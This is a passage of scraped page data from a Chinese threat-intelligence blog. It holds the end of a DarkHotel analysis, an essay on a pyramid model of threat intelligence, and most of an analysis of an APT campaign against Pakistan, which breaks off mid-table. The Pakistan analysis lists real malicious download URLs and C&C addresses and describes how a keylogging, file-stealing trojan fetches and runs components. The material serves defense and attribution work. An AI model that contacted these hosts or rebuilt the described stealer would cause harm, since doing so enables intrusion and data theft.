data-line="117"><img src="/uploads/2017/07/25/6b5c4521e39cf81dc97b2e2a9db91a55.png" alt="" width="90%"></p>\n<p class="line" data-line="119">沙箱检测：</p>\n<p class="text-center line" data-line="121"><img src="/uploads/2017/07/25/fff4437f85266db166109fd32f6b86cc.png" alt=""></p>\n<p class="text-center line" data-line="123"><img src="/uploads/2017/07/25/d2b88af9186a3f06f23b0318416a98bc.png" alt=""></p>\n<p class="line" data-line="125">检测360的产品:</p>\n<p class="text-center line" data-line="127"><img src="/uploads/2017/07/25/600f0fbdf110cdd3b07a651bcfbb6c8e.png" alt="" width="90%"></p>\n<p class="line" data-line="129">检测金山和baidu的安全产品：</p>\n<p class="text-center line" data-line="131"><img src="/uploads/2017/07/25/b16792e0261b9c2d3068a6e226d8b3ff.png" alt="" width="90%"></p>\n<p class="line" data-line="133">检测通过后，会连接C&amp;C地址的80端口，走SSL通信协议，把请求的数据包加密放到URL里，然后进行通信：</p>\n<p class="text-center line" data-line="135"><img src="/uploads/2017/07/25/7515b38914cd0b2fe7495d5089164ac1.png" alt="" width="90%"></p>\n<p class="line" data-line="137">C&amp;C域名为：view-drama-online.com</p>\n<h2 class="line" data-line="139">相关分析</h2>\n<p class="line" data-line="141">使用高级账号查询360威胁情报中心，样本涉及的域名 all-microsoft-control.com 其实早就被内部分析团队打上了相关的标签，而外部的大部分威胁情报平台对此域名没有做什么恶意性标记：</p>\n<p class="text-center line" data-line="143"><img src="/uploads/2017/07/25/d103771b3712fc6fae4ab8e6f460bdcb.png" alt=""></p>\n<p class="line" data-line="145">域名注册于2015年7月26日，在卡巴斯基在2014年的揭露报告以后注册，由此可见APT团伙在被公开以后并不会停止活动，根据我们的分析甚至手法上都没有大的改变。</p>\n<p class="line" data-line="147">虽然目前我们从那个域名已经下载不到 .EXE 的进一步恶意代码，但威胁情报中心包含的同源样本沙箱日志记录告诉我们还有多个历史下载路径：</p>\n<p class="text-center line" data-line="149"><img src="/uploads/2017/07/25/4d53ddecf1f93575b5c6b4ac64455edf.png" alt="" width="90%"></p>\n<p class="line" data-line="151">事实上，利用360威胁情报中心的基础数据，从一个域名、样本出发我们可以把DarkHotel团伙相关的很大一部分所使用的工具和网络基础设施信息关联出来，在此基础上分析其活动历史，甚至最终定位到幕后的来源。</p>\n<h2 class="line" data-line="153">关联组织</h2>\n<p class="line" data-line="155">360公司内部的长期跟踪了代号为APT-C-06的境外APT组织，其主要目标除了中国，还有其他国家，主要目的是窃取敏感数据信息，DarkHotel的活动可以视为APT-C-06组织一系列活动之一。在针对中国地区的攻击中，该组织主要针对政府、科研领域进行攻击，且非常专注于某特定领域，相关攻击行动最早可以追溯到2007年，至今还非常活跃。</p>\n<p class="line" data-line="157">该组织多次利用0day漏洞发动攻击，进一步使用的恶意代码非常复杂，相关功能模块达到数十种，涉及恶意代码数量超过200个。该组织主要针对Windows系统进行攻击，近期还会对基于Android系统的移动设备进行攻击。另外该组织进行载荷投递的方式除了传统的鱼叉邮件和水坑式攻击等常见手法，还主要基于另一种特殊的攻击手法。</p>\n<p class="line" data-line="159">我们将APT-C-06组织和其他APT组织的TTPs（战术、技术与步骤）进行了对比分析，该组织无论是整体实力还是威胁等级在现有的APT组织中都是属于很高的级别。从我们掌握的证据来看该组织有可能是由境外政府支持的黑客团体或情报机构。</p>\n<h2 class="line" data-line="161">IOC</h2>\n<center><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>类型</strong></td>\n<td><strong>值</strong></td>\n</tr>\n<tr>\n<td><em>Downloader Domain</em></td>\n<td>all-microsoft-control.com</td>\n</tr>\n<tr>\n<td><em>C&amp;C Domain</em></td>\n<td>view-drama-online.com</td>\n</tr>\n</tbody>\n</table>\n</center>\n'},{_id:"597733a71c670a09e493ee38",title:"威胁情报的层次分析",category:"安全观点",readableId:"level-of-threat-intelligence",abstract:"威胁情报，近几年来兴起的安全热点，已经从理念到技术再到平台逐步开始落地。不管是老牌的安全公司还是新兴的厂商都正在这方面探索，包括可行的技术方案、交换标准及商业模式。本文着重为读者介绍一下我所理解的威胁情报的层次，结合自身的实践，提出了一个金字塔模型，希望有助于提升业界对威胁情报的认识。",author:"汪列军",headImg:"/uploads/2017/08/17/16949b71be4886f4dbebd52178a1a204.png",descImg:"/uploads/2017/08/01/0e275715b71ac1ebf7c79054513124a2.png",tags:[],publish_time:"2016-04-22T17:32:44.000Z",content:'<h2 class="line" data-line="0">威胁情报的层次分析</h2>\n<p class="line" data-line="2">威胁情报，近几年来兴起的安全热点，已经从理念到技术再到平台逐步开始落地。不管是老牌的安全公司还是新兴的厂商都正在这方面探索，包括可行的技术方案、交换标准及商业模式。本文着重为读者介绍一下我所理解的威胁情报的层次，结合自身的实践，提出了一个金字塔模型，希望有助于提升业界对威胁情报的认识。</p>\n<h3 class="line" data-line="4">威胁情报的概念</h3>\n<p class="line" data-line="6">目前，Gartner对于威胁情报的定义比较广地被引用：</p>\n<p class="line" data-line="8">“Threat intelligence is evidence-based knowledge, including context, mechanisms, indicators, implications and actionable advice, about an existing or emerging menace or hazard to assets that can be used to inform decisions regarding the subject\'s response to that menace or hazard.”</p>\n<p class="line" data-line="10">这是一个比较理想化的定义，对情报应该包含的信息量提出了明确的要求，面向高端用户提供决策依据的完整情报样式，可以认为是狭义的威胁情报。</p>\n<p class="line" data-line="12">事实上，对于大多数的组织机构得不到上述这类准确和全面的情报服务，即便得到也无法采取应对措施。想象一下，即使有安全厂商能够告诉某个大公司一个安全威胁的背后的组织、国家背景甚至人员信息（这些都是高端威胁情报的必要组成部分），那又能如何？通常的组织机构不是执法机构，无法对这些情报采取什么缓解威胁的措施。</p>\n<p class="line" data-line="14">对一般的公司组织相对低端的入侵指示器（Indicator Of Compromise，IOC）可能更为实际些，它由可被边界安全设备和主机安全防护软件所使用的数据所构成，典型的入侵指示器有文件HASH、IP、域名、程序运行路径、注册表项等，这类威胁情报在下文有详细的分析。</p>\n<h3 class="line" data-line="16">威胁情报的作用</h3>\n<p class="line" data-line="18">通过对威胁情报的交换和共享，联合安全业界各方的力量，整合信息资源实现更大范围内的快速响应，以对抗也在不停进化的安全威胁。以下Webroot小纪念品上的图非常形象地表现了威胁情报所能起到的作用。</p>\n<p class="text-center line" data-line="20"><img src="/uploads/2017/07/25/869d3df44a6f8ecd3f9a9a262fb10259.png" alt=""></p>\n<p class="line" data-line="22">目前威胁情报作为一个安全关键词显得非常火热，但是显然被有些寄予了过高的期望，在安全领域不存在什么单点的银弹技术。准确及时的入侵指示数据可以帮助用户快速处理已经或正在发生的威胁，比如黑样本的HASH、对外连接的CC及Downloader服务器的IP或域名，网络边界设备或运行于主机上的Agent可以通过简单的匹配就能发现并采用自动化的应对措施。当用户试图分析一个可疑事件时，威胁情报可以为用户判定可疑事件的恶意性提供有用的参考资料，比如事件所涉及到的IP是否在某些已知的黑名单之中，相关的域名是否被已知的APT活动使用等。</p>\n<h3 class="line" data-line="24">威胁情报的层次</h3>\n<p class="text-center line" data-line="26"><img src="/uploads/2017/07/25/bc5008dcf0f163de8a317d8befd5eded.png" alt="" width="45%"></p>\n<p class="line" data-line="28">上图是我们构建的一个展示威胁情报层次的金字塔图，我们从下到上逐层解释一下每个层次的信息构成，所能发挥的作用及分析获取的方法。</p>\n<h4 class="line" data-line="30">文件HASH</h4>\n<p class="line" data-line="32">最底层威胁情报由文件构成，主要涉及恶意网络活动相关的各种恶意代码：Trojan、Backdoor、Downloader、Dropper等。一般来说，文件样本是整个事件分析的起点和基础性数据，其重要性相当于刑事案件调查中最主要的物证，比如凶器和尸体。用于标记文件的各种HASH是最基本威胁情报信息，可以方便地用于在目标系统上进行搜索，如果一个木马文件在系统上被发现则对象被感染的可能性就非常大。下图是Symantec发布的Butterfly攻击活动相关的部分文件HASH列表。</p>\n<p class="text-center line" data-line="34"><img src="/uploads/2017/07/25/797ed870122992cd8f261a4ff69eb6c9.png" alt="" width="90%"></p>\n<p class="line" data-line="36">绝大多数文件HASH的主要问题在于特异性太强，无论是MD5、SHA1、SHA256，只要文件出现一个比特位的变化就会导致完全不同的HASH值，这个特性在避免误报的同时也使攻击者可以通过最简单的内容修改来躲过检测，所以一旦被公开揭露，几乎立即过期。因此，文件HASH作为入侵指示器基本只能用来发现已发生的事件，对防御方来说需要用自动化的搜索匹配机制尽可能用其来缩短从事件发生到发现时间窗口，以尽可能减少损失。</p>\n<h4 class="line" data-line="38">主机和网络特征</h4>\n<p class="line" data-line="40">在文件HASH之上的是通过分析文件样本得到的直接关联的各类基于主机和网络特征，这些数据可以被用来作为入侵指示器。简单来说，主机特征可能包含恶意代码在机器上运行时产生的有区分能力的数据，比如程序运行时的Mutex、写入的注册表项、文件路径等，网络特征可能包含对外连接的C&amp;C或组件下载的IP/域名、访问的URL、通信协议等信息。下图是一个木马内置的主机与网络特征数据的例子。</p>\n<p class="text-center line" data-line="42"><img src="/uploads/2017/07/25/0952d915d9506860b3a4f8784debdacd.png" alt="" width="90%"></p>\n<p class="line" data-line="44">这些数据大多可以通过使样本运行于受控环境（沙箱和虚拟机）来获取，对于对抗强度较高的或无法运行的样本手工的逆向调试分析则有可能是必须的，这时就需要很大的时间与精力投入。相较于文件HASH，这些从文件中通过静态或动态分析得到的特征相对稳定，但改变的代价依然很小，特别是在被公开揭露出来以后，作为入侵指示器的价值也会很快消失。</p>\n<h4 class="line" data-line="46">事件层次情报</h4>\n<p class="line" data-line="48">在单个样本相关的信息以上为事件层次的威胁情报。当我们得到了大量文件样本相关的细节以后，通过分析其各个维度上的相似度就可以实现样本家族的分类。下图是三个疑似欧洲来源的秘密监控软件基于样本特征的同源性分析，可以看到一些关键特征保持一致，暗示它们有共同的源头。</p>\n<p class="text-center line" data-line="50"><img src="/uploads/2017/07/25/fd9f10aa52b4ba6c312ceb500b0cd377.png" alt="" width="90%"></p>\n<p class="line" data-line="52">通过分析样本之间的上下游关系，可以推断攻击发生时恶意代码的进入渠道，从而了解对手的攻击手法，通过鱼叉邮件、水坑攻击、U盘植入还是其他主动性的攻击，是否利用了安全漏洞，使用了什么样的社工技巧。了解攻击的方法对于防御方调整防护方案，填补漏洞和盲点，使防护更有针对性同时降低成本有重要的意义。下图是2015年360公司揭露的海莲花APT事件中攻击者所使用的恶意代码感染方式。</p>\n<p class="text-center line" data-line="54"><img src="/uploads/2017/07/25/9327cd893ec3f6e366e17d5e7448a629.png" alt="" width="90%"></p>\n<p class="line" data-line="56">如果收集到的数据包含受害者内部网络和主机的行为，我们还能了解攻击者在受害者内部系统中尝试进一步获取控制的方式和方法。因此，要得到的准确的事件层次的威胁情报，需要更多的数据输入，更多的分析资源投入，所以其得到的结果也包含了更大信息量。</p>\n<p class="line" data-line="58">以下我们整理了基于Lockheed Martin Kill Chain模型各环节中可用于做关联性分析的维度。</p>\n<center><table>\n<thead>\n<tr>\n<th><strong>侦察跟踪</strong></th>\n<th><strong>武器构建</strong></th>\n<th><strong>载荷投递</strong></th>\n<th><strong>突防利用</strong></th>\n<th><strong>安装植入</strong></th>\n<th><strong>通信控制</strong></th>\n<th><strong>达成目标</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>目标国家</td>\n<td>特定互斥量</td>\n<td>恶意代码进入方式</td>\n<td>漏洞利用</td>\n<td>初始启动路径</td>\n<td>域名注册信息</td>\n<td>目标数据</td>\n</tr>\n<tr>\n<td>目标个体</td>\n<td>执行流程</td>\n<td>鱼叉邮件</td>\n<td>社会工程学</td>\n<td>持续启动方式</td>\n<td>域名使用偏好</td>\n<td>打包方法</td>\n</tr>\n<tr>\n<td>涉及行业</td>\n<td>加解密方式</td>\n<td>水坑攻击</td>\n<td></td>\n<td>伪装正常模式</td>\n<td>域名命名偏好</td>\n<td>传输方法</td>\n</tr>\n<tr>\n<td></td>\n<td>特定功能模块</td>\n<td>U盘</td>\n<td></td>\n<td></td>\n<td>IP所在ASN</td>\n<td>破坏功能</td>\n</tr>\n<tr>\n<td></td>\n<td>对抗分析措施</td>\n<td>主动渗透</td>\n<td></td>\n<td></td>\n<td>后门工具</td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td>源码工程路径</td>\n<td></td>\n<td></td>\n<td></td>\n<td>工具类型</td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td>特定数据字串</td>\n<td></td>\n<td></td>\n<td></td>\n<td>工具配置</td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td>语言编译环境</td>\n<td></td>\n<td></td>\n<td></td>\n<td>通信协议</td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td>特定数字签名</td>\n<td></td>\n<td></td>\n<td></td>\n<td>认证凭据</td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td>组件组织架构</td>\n<td></td>\n<td></td>\n<td></td>\n<td>SSL证书</td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td>特别的错误</td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n</center>\n<p class="line" data-line="76">来自Lockheed Martin的一个实际的多个攻击事件基于要素关联的例子：</p>\n<p class="text-center line" data-line="78"><img src="/uploads/2017/07/25/46d475b0987decceed25d533d23f4a6b.png" alt=""></p>\n<h4 class="line" data-line="80">组织情报</h4>\n<p class="line" data-line="82">基于事件层次的事实收集与分析，我们可能可以分辨出多个攻击事件背后的同一个组织，并判定组织的来源、分工、资源状况、人员构成、行动目标等要素。</p>\n<p class="line" data-line="84">通过分析对手所使用工具开发维护状况、突破技术及通信基础设施，可以推断对手的资源状况。一般来说，使用自己开发的成系列的漏洞利用及控制工具，通信网络使用了较多的IP、域名及服务器资源，载荷投递时显示出专业的针对性技巧，则可以判断对手拥有较强的能力，有足够的资源支持，组织内部可能存在明确的分工。</p>\n<p class="line" data-line="86">组织的来源可以通过分析事件涉及的样本文件中包含的语言相关的特征来推断，比如字符串的语言、开发或打包工具的语言版本，对于非可执行的样本，也可以分析其默认的配置情况。在占有大量样本的情况下，可以通过分析样本的生成时间推断对手的日常工作时间，甚至休假情况，与特定国家的节假日做匹配，也可能成为分析对手来源的有效线索。如果有资源了解受影响目标的国家、行业及个体的分布，以及对手所发动的攻击类型（窃密型还是求财型）所使用的基础设施的地理位置，我们也可以非常有把握地推测出对手的来源。</p>\n<p class="line" data-line="88">以下是Cylance一个名为Operation Cleaver的APT活动的来源要点分析：</p>\n<p class="text-center line" data-line="90"><img src="/uploads/2017/07/25/cd97a55e18a34675df8f37d50c89f233.png" alt="" width="90%"> {</p>\n<h4 class="line" data-line="92">人员情报</h4>\n<p class="line" data-line="94">在组织之上的是人员相关的威胁情报，这是威胁分析的最后一环，实现虚拟身份到现实身份的映射。</p>\n<p class="line" data-line="96">人处在威胁情报金字塔的顶端，因为它是整个威胁体系中最稳定的部分，一旦定位到人也就定位到了威胁产生的根源，解决人的问题是真正釜底抽薪的解决方案。弗诺·文奇写过一篇非常精彩的小说，名字就叫《真名实姓》，未来虚拟空间里最大的问题就是如何把其中的角色对应到现实中的人，一旦完成映射就意味着战斗的结束。这是因为如果我们处理的对象是人，就意味着解决问题的手段不会再受限于技术可能性。所有处于人之下的威胁情报类型我们一般只能采取技术手段来处理，比如我们知道一些攻击相关的IOC（样本、IP或域名），对其有效的处置手段主要局限于人工或自动化的识别、隔离及阻断等。而当我们对抗对象是人时，那么可采用的手段就可以丰富得多，我们不仅可以对目标本身还可以对其所在环境施加压力，利用人性的弱点就能实现类似降维攻击的效果。</p>\n<p class="line" data-line="98">要得到这类情报，信息的输入也就不再限于技术分析，可能需要其他方面的数据输入及非常规的取证手段，比如真实注册信息、社交账号的关联数据、交易数据、蜜罐及反制。下图是360公司使用交互式数据关联系统对XcodeGhost事件的始作俑者的追溯演示，从攻击者所使用的一个C&amp;C域名（做了隐私保护）出发通过层层前推最终定位到一个关联域名，而攻击者用其真实名字注册的它。</p>\n<p class="text-center line" data-line="100"><img src="/uploads/2017/07/25/3145339917e5bd870cb7285522b4a5ba.png" alt="D:\\work\\skyeye\\产品截图\\xcode.JPG" width="90%"> {</p>\n<h3 class="line" data-line="103"><strong>参考链接</strong></h3>\n<p class="line" data-line="105"><a href="https://malwareconfig.com/">Malwareconfig</a></p>\n<p class="line" data-line="107"><a href="https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/butterfly-corporate-spies-out-for-financial-gain.pdf">Butterfly: Corporate spies out for fiancial gain</a></p>\n<p class="line" data-line="109"><a href="https://www.blackhat.com/docs/us-15/materials/us-15-MarquisBoire-Big-Game-Hunting-The-Peculiarities-Of-Nation-State-Malware-Research.pdf">BIG GAME HUNTING: THE PECULIARITIES OF NATION-STATE MALWARE RESEARCH</a></p>\n<p class="line" data-line="111"><a href="https://ti.360.com/upload/report/file/OceanLotusReport.pdf">OceanLotus (APT-C-00)数字海洋的游猎者</a></p>\n<p class="line" data-line="113"><a href="http://www.lockheedmartin.com/content/dam/lockheed/data/corporate/documents/LM-White-Paper-Intel-Driven-Defense.pdf">Intelligence-Driven Computer Network Defense Informed by Analysis of Adversary Campaigns and Intrusion Kill Chains</a></p>\n<p class="line" data-line="115"><a href="https://cdn2.hubspot.net/hubfs/270968/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf">Operation Cleaver</a></p>\n'}],pageTotal:2}]}],error:null,state:{pageId:[],tagParam:[],isMainPage:!0,pageNum:[1,2],articleData:{_id:"597733a71c670a09e493ee3d",title:"针对巴基斯坦的某APT活动事件分析",category:"事件追踪",readableId:"pakistan-targeted-apt-campaign",abstract:"2017年6月， 360威胁情报中心发现了一份可疑的利用漏洞执行恶意代码的Word文档，经过分析后，我们发现这有可能是一起针对巴基斯坦的政府官员的APT攻击事件，释放出来的载荷会收集受害者的键盘记录和重要软件密码、文档等。本文档对并对此次攻击事件的攻击链条进行梳理，并对使用的木马相关技术进行分析。",author:"黄朝文",headImg:"/uploads/2017/08/17/13296b2306bed22900c8f2ffd7d3242a.png",descImg:"/uploads/2017/08/01/e3c37af797ae3d864e14f3e178ef86d5.png",tags:["APT","Pakistan"],publish_time:"2016-06-23T18:05:05.000Z",content:'<h2 class="line" data-line="0">事件背景</h2>\n<p class="line" data-line="2">2017年6月， 360威胁情报中心发现了一份可疑的利用漏洞执行恶意代码的Word文档，经过分析后，我们发现这有可能是一起针对巴基斯坦的政府官员的APT攻击事件，释放出来的载荷会收集受害者的键盘记录和重要软件密码、文档等。本文档对并对此次攻击事件的攻击链条进行梳理，并对使用的木马相关技术进行分析。</p>\n<h2 class="line" data-line="4">样本分析</h2>\n<h3 class="line" data-line="6">漏洞利用Dropper</h3>\n<center><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Hash</strong></td>\n<td>4f4cc89905bea999642a40d0590bdfa3</td>\n</tr>\n<tr>\n<td><strong>文件类型</strong></td>\n<td>Word文档</td>\n</tr>\n<tr>\n<td><strong>文件大小</strong></td>\n<td>66Kb</td>\n</tr>\n<tr>\n<td><strong>文件名</strong></td>\n<td>peace-along-the-border-is-not-a-one-process-says-Lt-gen-ds-hooda.doc</td>\n</tr>\n</tbody>\n</table>\n</center>\n<p class="line" data-line="17">该文档所利用的漏洞为CVE-2015-2545（关于该漏洞的分析已经有不少详细分析的资料，这里就不再赘述），当受害者点开该文档时，会加载EPS文件从而触发漏洞，这里攻击者使用的漏洞利用代码是已经在野外流传很久的成熟利用，这套利用的特点是通过shellcode注入explorer进程下载木马文件，但shellcode后附加一个DLL文件以利用CVE-2015-2546权限提升漏洞得到系统最高权限。</p>\n<p class="line" data-line="19">注入explorer.exe的代码如下：</p>\n<p class="text-center line" data-line="21"><img src="/uploads/2017/07/25/eb9521a61de45d6696701d74995cfc2f.png" alt="" width="90%"></p>\n<p class="line" data-line="23">explorer.exe中下载载荷的代码如下：可以看到下载地址为http://tes[.]sessions4life[.]pw/quiz/WelcomeScrn.exe</p>\n<p class="text-center line" data-line="25"><img src="/uploads/2017/07/25/b659e713974a2508b1eb331696921a64.png" alt="" width="90%"></p>\n<p class="line" data-line="27">CVE-2015-2546权限提升DLL部分代码：</p>\n<p class="text-center line" data-line="29"><img src="/uploads/2017/07/25/80a5702267f59cc449a8a99109decec5.png" alt="" width="90%"></p>\n<h3 class="line" data-line="31">WelcomeScrn.exe</h3>\n<center><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Hash</strong></td>\n<td>feea1d90e77dff5ff9f896122cf768f6</td>\n</tr>\n<tr>\n<td><strong>文件类型</strong></td>\n<td>PE可执行文件</td>\n</tr>\n<tr>\n<td><strong>文件大小</strong></td>\n<td>124Kb</td>\n</tr>\n<tr>\n<td><strong>文件名</strong></td>\n<td>WelcomeScrn.exe</td>\n</tr>\n</tbody>\n</table>\n</center>\n<p class="line" data-line="42">这是个downloader，功能非常简单，直接连接到内置网址http://185[.]109[.]144[.]102/DistBuild/DefenderReference.exe，下载并执行文件。</p>\n<p class="text-center line" data-line="44"><img src="/uploads/2017/07/25/289299000188e3e0f3367813412d3323.png" alt=""></p>\n<h3 class="line" data-line="46">DefenderReference.exe</h3>\n<center><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Hash</strong></td>\n<td>c43bab60cbf7922a35979e4f41f9aa9e</td>\n</tr>\n<tr>\n<td><strong>文件类型</strong></td>\n<td>PE可执行文件</td>\n</tr>\n<tr>\n<td><strong>文件大小</strong></td>\n<td>747Kb</td>\n</tr>\n<tr>\n<td><strong>文件名</strong></td>\n<td>DefenderReference.exe</td>\n</tr>\n</tbody>\n</table>\n</center>\n<p class="line" data-line="57">DefenderReference.exe通过HTTP协议与服务器通信的窃密木马，被执行起来后，会先完成一些初始化的工作，释放并加载WER167893459067.dll后创建以下目录：</p>\n<ul>\n<li>%Local%\\SharedFiles\\Log</li>\n<li>% Local %\\ SharedFiles \\Sys</li>\n<li>% Local %\\ SharedFiles \\Temp</li>\n<li>% Local %\\ SharedFiles \\WinAero</li>\n<li>% Local %\\ SharedFiles \\WinDataShots</li>\n<li>% Local %\\ SharedFiles \\WinInternetData</li>\n<li>% Local %\\ SharedFiles \\WinLog</li>\n<li>% Local %\\ SharedFiles \\WinRM</li>\n</ul>\n<p class="line" data-line="68">然后终止cmd.exe、PATHPING.EXE、TRACERT.EXE、net.exe、systeminfo.exe进程,并判断自身进程启动路径是否为% Local %\\ SharedFiles \\Sys，如果不是，则将自身拷贝到% Local %\\ SharedFiles \\Sys\\ DefenderReference.exe，释放MSOBuild.exe、AdminNewDll.dll、AdminServerDll.dll等文件，最后启动MSOBuild.exe</p>\n<p class="text-center line" data-line="70"><img src="/uploads/2017/07/25/67cfd127816a0b08e055a75b5f3749fb.png" alt="" width="90%"></p>\n<p class="text-center line" data-line="72"><img src="/uploads/2017/07/25/f5fcabe462f04323612f741364ad9ee4.png" alt="" width="90%"></p>\n<h3 class="line" data-line="74">MSOBuild.exe</h3>\n<center><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Hash</strong></td>\n<td>c5f76015b2cb15f59070d2e5cfdd8f6e</td>\n</tr>\n<tr>\n<td><strong>文件类型</strong></td>\n<td>PE可执行文件</td>\n</tr>\n<tr>\n<td><strong>文件大小</strong></td>\n<td>147Kb</td>\n</tr>\n<tr>\n<td><strong>文件名</strong></td>\n<td>MSOBuild.exe</td>\n</tr>\n</tbody>\n</table>\n</center>\n<p class="line" data-line="85">这个文件其实还是个downloader，在初始化和检查执行环境（虚拟机、沙箱、调试）后，访问http://docs.google.com/uc?id=0Bx9cf6a5Mapaa3g4MlI4T244SlU&amp;export=download,获取C&amp;C的地址185.109.144.102</p>\n<p class="line" data-line="87">接着下载以下配置文件：</p>\n<ul>\n<li>hxxp://185[.]109.144.102/DistBuild/getAllFiles.php(指明需要下载的组件)</li>\n<li>http://185[.]109.144.102/DistBuild/getExecutables.php (指明要执行的组件)</li>\n<li>http://185[.]109.144.102/DistBuild/getExtensions_doc.php (指明关心的文档类型文件后缀名)</li>\n<li>http://185[.]109.144.102/DistBuild/ getExtensions_nondoc.php (指明关心的非文档文件类型)</li>\n<li>http://185[.]109.144.102/DistBuild/getExtensions_rmdrive.php (指明要执行的组件)</li>\n</ul>\n<p class="text-center line" data-line="95"><img src="/uploads/2017/07/25/a7cadc72c9ec9521e5aed7c0499ff14f.png" alt="" width="90%"></p>\n<p class="line" data-line="97">接着下载配置文件中指定的组件，再一一启动这些组件：</p>\n<p class="text-center line" data-line="99"><img src="/uploads/2017/07/25/57cc6ae8567dd473da18554bd80e7f87.png" alt="" width="90%"></p>\n<p class="line" data-line="101">下表是木马的各个组件信息：</p>\n<center><table>\n<thead>\n<tr>\n<th><strong>文件名</strong></th>\n<th><strong>备注</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>DefenderReference.exe</td>\n<td>Dropper</td>\n</tr>\n<tr>\n<td>MSOBuild.exe</td>\n<td>通过调用AdminServerDll.dll下载其他组件</td>\n</tr>\n<tr>\n<td>AdminServerDll.dll</td>\n<td>功能模块，每个导出函数对应一种功能</td>\n</tr>\n<tr>\n<td>AdminNewDll.dll</td>\n<td>检测到虚拟机\\沙箱时加载的无效dll</td>\n</tr>\n<tr>\n<td>PackageMSOffce.exe</td>\n<td>上传文档类型文件</td>\n</tr>\n<tr>\n<td>PlayMedia.exe</td>\n<td>上传非文档类型文件</td>\n</tr>\n<tr>\n<td>TimeSyncApp.exe</td>\n<td>发送受害者信息，等待指令</td>\n</tr>\n<tr>\n<td>FoldrOpt.exe</td>\n<td>设置启动项、检查环境、收集计算机信息</td>\n</tr>\n<tr>\n<td>OptimisedDisply.exe</td>\n<td>屏幕截图、上传截图</td>\n</tr>\n<tr>\n<td>LangEngUTF16.exe</td>\n<td>上传键盘记录</td>\n</tr>\n<tr>\n<td>LangEngUTF8.exe</td>\n<td>键盘记录</td>\n</tr>\n<tr>\n<td>InstntAccelx.exe</td>\n<td>检测U盘，自拷贝进行传播</td>\n</tr>\n<tr>\n<td>InstntAccelx.exe</td>\n<td>检测U盘，上传U盘内的文件</td>\n</tr>\n</tbody>\n</table>\n</center>\n<p class="line" data-line="121">经过以上分析，我们发现这个木马家族有以下功能：上传/下载文件、执行指定文件、键盘记录、屏幕截图、感染U盘、发送感染电脑位置信息等，窃取的文件列表如下：</p>\n<ul>\n<li>.doc</li>\n<li>.docx</li>\n<li>.ppt</li>\n<li>.pps</li>\n<li>.pptx</li>\n<li>.ppsx</li>\n<li>.xls</li>\n<li>.xlsx</li>\n<li>.pdf</li>\n<li>.inp</li>\n<li>.vcf</li>\n<li>.txt</li>\n<li>.jpg</li>\n<li>.jpeg</li>\n<li>.bmp</li>\n<li>.gif</li>\n<li>.png</li>\n<li>.avi</li>\n<li>.wmv</li>\n<li>.mp4</li>\n<li>.mpg</li>\n<li>.mpeg</li>\n<li>.3gp</li>\n<li>.mp3</li>\n<li>.wav</li>\n</ul>\n<p class="line" data-line="149">并且该木马可以通过在线获取新插件的形式迅速方便地扩展更多的功能。木马的代码清晰、结构严谨，受控端通过HTTP请求与控制服务器通信，访问不同的php页面代表执行不同的功能，可能是高度定制的专用木马，或者是专门出售的商业间谍木马。</p>\n<p class="line" data-line="151">下面介绍该木马比较有特色的地方：</p>\n<ol>\n<li>不同的组件都通过调用同一个AdminServerDll.dll来完成具体功能，高度模块化。例如MSOBuild.exe和DefenderReference.exe中，分别获取AdminServerDll.dll的不同导出函数，然后调用这些导出函数，程序里只有基本的逻辑而没有具体的功能实现，下面左边是MSOBuild.exe,右边是DefenderReference.exe</li>\n</ol>\n<p class="text-center line" data-line="155"><img src="/uploads/2017/07/25/95424d612fcb7769b0291f79a5969a56.png" alt="" width="90%"></p>\n<p class="text-center line" data-line="157"><img src="/uploads/2017/07/25/cf66e0663f24d7def1df2cdca3b1a9a0.png" alt="" width="90%"></p>\n<p class="line" data-line="159">其中AdminServerDll.dll是主要的功能模块，其每一个导出函数对应一个功能，可以从导出函数名知道其功能，如下：</p>\n<center><table>\n<thead>\n<tr>\n<th><strong>导出函数</strong></th>\n<th><strong>备注</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>EHCheckDownloadedFilesInDownloadFolderAreCompleteForModuleFile</td>\n<td>检查组件是否完整</td>\n</tr>\n<tr>\n<td>EHCheckFolderRecursive</td>\n<td>遍历文件目录</td>\n</tr>\n<tr>\n<td>EHCopyDirectory</td>\n<td>拷贝目录</td>\n</tr>\n<tr>\n<td>EHCountFilesInFolder</td>\n<td>遍历目录下面文件数</td>\n</tr>\n<tr>\n<td>EHCreateCompleteDirectoryStructure</td>\n<td>创建前面提到的Log、Sys等全部目录</td>\n</tr>\n<tr>\n<td>EHCreateDirectoryStructureFolderPath</td>\n<td>创建前面提到的Log、Sys中的指定目录</td>\n</tr>\n<tr>\n<td>EHCreateFileListForFolder</td>\n<td>获取目录文件列表</td>\n</tr>\n<tr>\n<td>EHCreateFolderHerarchyOnServer</td>\n<td>在服务端创建对应主机的目录</td>\n</tr>\n<tr>\n<td>EHCreateFolderHerarchyOnServerNeo</td>\n<td>在服务端创建对应主机的目录</td>\n</tr>\n<tr>\n<td>EHCreateFolderOnServerWithName</td>\n<td></td>\n</tr>\n<tr>\n<td>EHCreateFolderOnServerWithNameNeo</td>\n<td></td>\n</tr>\n<tr>\n<td>EHDeleteDirectory</td>\n<td>EHDeleteFilesInFolder</td>\n</tr>\n<tr>\n<td>EHDeleteListerUploaderFileOnServer</td>\n<td></td>\n</tr>\n<tr>\n<td>EHDownLoadListerUploaderFileFromServer</td>\n<td></td>\n</tr